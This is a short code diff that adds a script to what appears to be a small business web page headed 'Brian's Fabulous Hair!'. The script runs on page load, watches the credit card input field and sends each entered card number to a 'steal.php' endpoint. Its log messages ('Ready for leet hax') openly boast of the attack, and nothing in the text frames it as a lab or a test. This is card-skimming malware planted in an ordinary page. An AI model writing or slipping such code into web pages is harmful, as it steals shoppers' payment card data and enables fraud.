@@ -1,0 +1,22 @@
+<script defer="defer">
+    window.onload = function() {
+        console.log("Ready for leet hax");
+        var ccField = document.getElementById("cc");
+        if (ccField) {
+            console.log("Targeted ccField!");
+            ccField.addEventListener("change", function () {
+                console.log(ccField.value);
+
+                $.ajax({
+                    type: "POST",
+                    url: "steal.php",
+                    data: { cc: ccField.value }
+                });
+
+                console.log("Request was sent");
+
+            });
+        };
+    };
+</script>
+Brian's Fabulous Hair!
